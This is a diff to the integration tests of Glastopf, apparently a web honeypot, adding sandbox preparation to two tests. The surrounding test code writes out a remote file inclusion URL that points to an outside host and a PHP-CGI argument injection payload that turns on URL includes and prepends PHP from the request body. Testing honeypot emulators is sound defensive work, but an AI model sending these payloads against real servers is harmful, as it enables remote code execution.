@@ -25,6 +25,7 @@ import inspect
 import helpers
 
 from glastopf.modules.handlers.request_handler import RequestHandler
+from glastopf.glastopf import GlastopfHoneypot
 import glastopf.modules.events.attack as attack
 import glastopf.modules.HTTP.util as util
 
@@ -37,8 +38,8 @@ class TestEmulatorIntegration(unittest.TestCase):
     def setUp(self):
         self.event = attack.AttackEvent()
         self.event.parsed_request = util.HTTPRequest()
-        self.tmp_dir = tempfile.mkdtemp()
-        self.data_dir = os.path.join(self.tmp_dir, 'data/')
+        self.work_dir = tempfile.mkdtemp()
+        self.data_dir = os.path.join(self.work_dir, 'data/')
         package_directory = os.path.dirname(os.path.abspath(inspect.getfile(RequestHandler)))
         #original data as stored with new glatopf installations
         self.original_data_dir = os.path.join(package_directory, 'emulators/data/')
@@ -47,8 +48,8 @@ class TestEmulatorIntegration(unittest.TestCase):
 
     def tearDown(self):
         del self.event
-        if os.path.isdir(self.tmp_dir):
-            shutil.rmtree(self.tmp_dir)
+        if os.path.isdir(self.work_dir):
+            shutil.rmtree(self.work_dir)
 
 
     def test_dummy_emulator(self):
@@ -140,6 +141,7 @@ class TestEmulatorIntegration(unittest.TestCase):
         Input: http://localhost:8080/test.php?p=http://google.com/index.html
         Expected Result: The return value from the PHP sandbox.
         Notes: Injected file contains <?php echo("test successful"); ?>"""
+        GlastopfHoneypot.prepare_sandbox(self.work_dir)
         print "Starting remote file inclusion test"
         self.event.parsed_request = util.HTTPRequest()
         self.event.parsed_request.url = "/test.php?p=http://1durch0.de/test_file.txt"
@@ -243,6 +245,7 @@ class TestEmulatorIntegration(unittest.TestCase):
         Input: http://localhost/-d+allow_url_include=on+-d+safe_mode=off+-d+open_basedir=off-d+auto_prepend_file=php://input POST: <?php echo("rce attempt"); ?>
         Expected Result: Remote command execution of a echo command
         Notes:"""
+        GlastopfHoneypot.prepare_sandbox(self.work_dir)
         os.mkdir(os.path.join(self.data_dir, 'files/'))
         self.event.parsed_request = util.HTTPRequest()
         self.event.parsed_request.method = 'POST'
